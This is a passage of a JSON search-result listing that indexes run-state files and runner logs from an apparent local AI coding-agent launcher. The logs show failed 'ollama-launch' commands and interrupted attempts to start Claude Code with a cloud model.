".data/runs/PMWnfTuHA-JJ/runner.log", "start_line": 1, "end_line": 1, "language": "log"}}, {"corpus": "code", "source": ".data/runs/PMWnfTuHA-JJ/state.json", "location": ".data/runs/PMWnfTuHA-JJ/state.json:1", "score": 0.0, "content": "{\n  \"runId\": \"PMWnfTuHA-JJ\",\n  \"sequence\": 1,\n  \"workingDir\": \"C:\\\\Users\\\\TimShelton\\\\source\\\\repos\\\\VisualSynth\",\n  \"autonomous\": false,\n  \"workerType\": \"ollama\",\n  \"model\": \"qwen2.5-coder:7b\",\n  \"savedAt\": 1769633335047\n}", "metadata": {"file": ".data/runs/PMWnfTuHA-JJ/state.json", "start_line": 1, "end_line": 9, "language": "json"}}, {"corpus": "code", "source": ".data/runs/TLJHk2fVNuYP/runner.log", "location": ".data/runs/TLJHk2fVNuYP/runner.log:1", "score": 0.0, "content": "[stderr] 'ollama-launch' is not recognized as an internal or external command,\noperable program or batch file.\n[stderr] 'ollama-launch' is not recognized as an internal or external command,\noperable program or batch file.\n[stderr] 'ollama-launch' is not recognized as an internal or external command,\noperable program or batch file.\n[stderr] 'ollama-launch' is not recognized as an internal or external command,\noperable program or batch file.\n[stderr] Error: accepts at most 1 arg(s), received 14\n[stderr] \nLaunching Claude Code with glm-4.7:cloud...\n[stderr] ^C[stderr] \nLaunching Claude Code with glm-4.7:cloud...\n[stderr] ^C[stderr] \nLaunching Claude Code with glm-4.7:cloud...", "metadata": {"file": ".data/runs/TLJHk2fVNuYP/runner.log", "start_line": 1, "end_line": 15, "language": "log"}}, {"corpus": "code", "source": ".data/runs/TLJHk2fVNuYP/state.json", "location": ".data/runs/TLJHk2fVNuYP/state.json:1", "score": 0.0, "content": "{\n  \"runId\": \"TLJHk2fVNuYP\",\n  \"sequence\": 6,\n  \"workingDir\": \"C:\\\\Users\\\\TimShelton\\\\source\\\\repos\\\\VisualSynth\",\n  \"autonomous\": false,\n  \"workerType\": \"ollama-launch\",\n  \"model\": \"claude\",\n  \"savedAt\": 1769636176080\n}", "metadata": {"file": ".data/runs/TLJHk2fVNuYP/state.json", "start_line": 1, "end_line": 9, "language": "json"}}]}